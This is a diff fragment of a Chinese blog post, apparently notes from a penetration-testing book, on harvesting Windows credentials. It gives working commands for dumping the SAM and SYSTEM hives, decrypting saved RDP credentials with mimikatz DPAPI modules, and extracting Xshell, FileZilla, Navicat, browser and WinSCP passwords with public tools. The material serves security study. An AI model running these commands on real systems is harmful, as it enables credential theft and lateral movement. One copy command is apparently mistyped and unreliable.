+<p>离线读取就是将SAM文件导出，再用mimikatz来读取。不过为了提高 SAM 文件的安全性以防止离线破解，Windows 会对 SAM 文件使用密钥进行加密，这个密钥存储在 SYSTEM 文件中，与 SAM 文件位于相同目录下。</p>
+<p>因为系统在运行时，这两个文件是被锁定的，所以需要借助一些工具来实现，而PowerSploit 项目中提供的Invoke-NinjaCopy.ps1脚本可以完成这项工作</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SAM&quot; -LocalDestination C:\Temp\SAM<br><br>Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SAM&quot; -LocalDestination C:\Temp\SYSTEM<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>此外如果能够提权，测试人员可以直接读取SAM和SYSTEM</p>
+</blockquote>
+<p>还可以在管理员权限下通过保存注册表的方式导出</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">reg save HKLM\SAM sam.hive<br>reg save HKLM\SYSTEM system.hive<br></code></pre></td></tr></table></figure>
+
+<p>然后将导出的两个文件使用mimikatz加载并读取sam中的用户凭据信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mimikatz.exe &quot;lsadump::sam /sam:sam.hive /system:system.hive&quot; exit<br></code></pre></td></tr></table></figure>
+
+<h2><span id="huo-qu-chang-jian-ying-yong-ruan-jian-ping-ju">获取常见应用软件凭据</span><a href="#huo-qu-chang-jian-ying-yong-ruan-jian-ping-ju" class="header-anchor">#</a></h2><p>为了扩大可访问的范围，测试人员通常会搜索各种常见的密码存储位置，以获取用户凭据。一些特定的应用程序可以存储密码，以方便用户管理和维护，如Xmanager、TeamViewer、FileZilla、NaviCat和各种浏览器等。通过对保存的用户凭据进行导出和解密，测试人员通常可以获取登录内网服务器和各种管理后台的账号密码，可以通过它们进行横向移动和访问受限资源。</p>
+<p><strong>获取RDP保存的凭据</strong></p>
+<p>为了避免每次连接服务器都进行身份验证，经常使用RDP远程桌面连接远程服务器的用户可能勾选保存连接凭据，以便进行快速的身份验证。这些凭据都使用数据保护API以加密形式存储在 Windows 的凭据管理器中，路径为%USERPROFILE%\AppData\LocalMicrosoft\Credentials </p>
+<blockquote>
+<p>%USERPROFILE%即为C:\Users&lt;用户名&gt;</p>
+</blockquote>
+<p>下面命令可以查看当前主机上保存的所有连接凭据</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cmdkey /list #查看当前保存的凭据<br>dir /a %USERPROFILE%\AppData\LocalMicrosoft\Credentials\* #遍历Credentials下保存的所有凭据<br></code></pre></td></tr></table></figure>
+
+<p>我这里没有凭据所以就借助书中的图来记录，我们可以看到两个历史凭据</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325003242224.png" alt="image-20240325003242224" class="lazyload"></p>
+<p>然后用mimikatz来导出指定RDP连接凭据，执行下面命令解析连接凭据</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;dpapi::cred /in:%USERPROFILE%\AppData\LocalMicrosoft\Credentials\2B23BCADBE2FAD8EA21E6E9F0516772C&quot;<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325003535797.png" alt="image-20240325003535797" class="lazyload"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325003553911.png" alt="image-20240325003553911" class="lazyload"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325003606845.png" alt="image-20240325003606845" class="lazyload"></p>
+<p>上图中得到的 pbData就是凭据的加密数据，guidMasterKey 是该凭据的 GUID，记录 guidMasterKey 的值。然后执行以下命令:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa:dpapi&quot; exit<br></code></pre></td></tr></table></figure>
+
+<p>找到与 guidMasterKey(GUID)相关联的MasterKey，这个MasterKey就是加密凭据所使用的密钥。</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325003915323.png" alt="image-20240325003915323" class="lazyload"></p>
+<p>记录结果中的MasterKey值，最后执行下面命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;dpapi::cred /in:%USERPROFILE%\AppData\LocalMicrosoft\Credentials\2B23BCADBE2FAD8EA21E6E9F0516772C/masterkey:&lt;刚刚记录的masterkey的值&gt;&quot; exit<br></code></pre></td></tr></table></figure>
+
+<p>最后成功解密得到RDP明文凭据</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325004214310.png" alt="image-20240325004214310" class="lazyload"></p>
+<p><strong>获取Xshell保存的凭据</strong></p>
+<p>Xshell 会将服务器连接信息保存在Session目录下的.xsh 文件中，路径如表 如下图。如果用户在连接时勾选了“记住用户名&#x2F;密码”，该文件会保存远程服务器连接的用户名和经过加密后的密码。</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325004349401.png" alt="image-20240325004349401" class="lazyload"></p>
+<p>Xshell 7 前的版本，测试人员可以直接通过 SharpDecryptPwd 工具进行解密，包括Navicat、TeamViewer、FileZilla、WinSCP和Xmangager 系列产品，工具地址：<a target="_blank" rel="noopener" href="https://github.com/uknowsec/SharpDecryptPwd">https://github.com/uknowsec/SharpDecryptPwd</a></p>
+<p>将工具上传到主机，执行下面命令可以直接获取Xshell保存的所有连接凭据</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">SharpDecryptPwd.exe -Xmangager -p &quot;%USERPROFILE%\Documents\NetSarang Computer 6\Xshell\Sessions&quot;<br></code></pre></td></tr></table></figure>
+
+<p>Xshell 7后的版本，Session目录中不再存储用户密码，用上述方法获取的密码为一串乱码，只能使用星号密码查看器直接查看密码.</p>
+<p><strong>获取FileZilla保存的凭据</strong></p>
+<p>FileZilla 是一款快速的、可依赖的、开源的 FTP 客户端软件，具备大多数 FTP 软件功能。FileZila会将所有FTP登录凭据以Base64密文的格式保存在%USERPROFILE%\AppData\Roaming\FileZilla\recentservers.xml文件中,如图所示。</p>
+<p>由图可知<user>节点记录了 FTP 登录用户,<pass>节点记录了 Base64 加密后的用户密码，将加密的FTP密码解码即可。</pass></user></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325004912460.png" alt="image-20240325004912460" class="lazyload"></p>
+<p>使用SharpDecryptPwd执行下面命令可以一键导出FileZilla保存的FTP登录凭据</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">SharpDecryptPwd.exe -FileZilla<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325005038300.png" alt="image-20240325005038300" class="lazyload"></p>
+<p><strong>获取NaviCat保存的凭据</strong></p>
+<p>用户连接数据库时，需要填写相关信息，如IP、用户名、密码等。用户选择保存密码(默认勾选)后，Navicat将把这些信息保存到注册表中，具体路径如下表</p>
+<table>
+<thead>
+<tr>
+<th>数据库类型</th>
+<th>凭据存储路径(注册表)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Mysql</td>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers\&lt; Connetion Name&gt;</td>
+</tr>
+<tr>
+<td>MariaDB</td>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers\&lt; Connetion Name&gt;</td>
+</tr>
+<tr>
+<td>MongoDB</td>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers\&lt; Connetion Name&gt;</td>
+</tr>
+<tr>
+<td>SQL SERVER</td>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\&lt; Connetion Name&gt;</td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers\&lt; Connetion Name&gt;</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers\&lt; Connetion Name&gt;</td>
+</tr>
+<tr>
+<td>SQLite</td>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers\&lt; Connetion Name&gt;</td>
+</tr>
+</tbody></table>
+<p>数据库的连接记录中的Pwd键的值为经过Navicat&lt;&#x3D;11版本算法加密过后的密码，可以在网上搜索解密脚本解出。</p>
+<p>也可以直接使用 Navicat 导出所有连接，将生成connections.ncx 文件，保存所有连接记录。其中，“Password”对应的值即使用 Navicat&gt;&#x3D;12 版本算法加密过后的密码，再对其进行解密。</p>
+<p>下面命令可以一键导出当前主机上用户连接过的所有数据库的登录凭据</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">SharpDecryptPwd.exe -NavicatCrypto<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325010347363.png" alt="image-20240325010347363" class="lazyload"></p>
+<p><strong>获取浏览器保存的登陆凭据</strong></p>
+<p>Web 浏览器通常会保存网站用户名和密码等凭据，以避免多次手动输入。通常，用户的凭据以加密格式存储在本地文件中，测试人员可以通过读取特定的文件，从Web 浏览器中获取凭据。</p>
+<p>HackBrowserData 是一款开源工具，可以直接从浏览器解密数据包括用户登录密码书签、Cookie、历史记录、信用卡、下载链接等，支持流行的浏览器，可在 Windows、macOS 和 Linux平台上运行，工具地址：<a target="_blank" rel="noopener" href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a></p>
+<p>只需将 HackBrowserData 上传到目标主机，然后直接运行即可，执行完毕后，会在当前目录下生成一个 result 目录，包含当前主机中已安装的所有浏览器保存的用户登录密码、浏览器书签、Cookie、历史记录等信息的 CSV 文件。</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325005731788.png" alt="image-20240325005731788" class="lazyload"></p>
+<p>用excel打开就可以看到解密出来的所有登陆凭据</p>
+<p><strong>获取WinSCP保留的登陆凭据</strong></p>
+<p>WinSCP是Windows环境下使用SSH的开源图形化SFTP 工具客户端。在使用SFTP连接时，如果勾选了“保存密码”，WinSCP就会将密码保存在WinSCP.ini文件下。Winscppwd工具则可以进行解密。</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325005905488.png" alt="image-20240325005905488" class="lazyload"></p>
+
 	</article>
 
 	 
@@ -530,7 +860,7 @@
   
 	<div class="kira-post-nav">
 		<nav class="post-nav">
-			                                  
+			                                      
 			<!-- 先找到与当前文字相同的目录 -->
 			      
 			<!-- 在找到当前文章所在的 index -->
@@ -540,7 +870,7 @@
 				<span>上一章</span>
 				<a href="/2024/03/15/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%8A%80%E6%9C%AF-1/"> 权限提升技术-1</a>
 			</div>
-			                          
+			                      
 		</nav>
 	</div>
 	
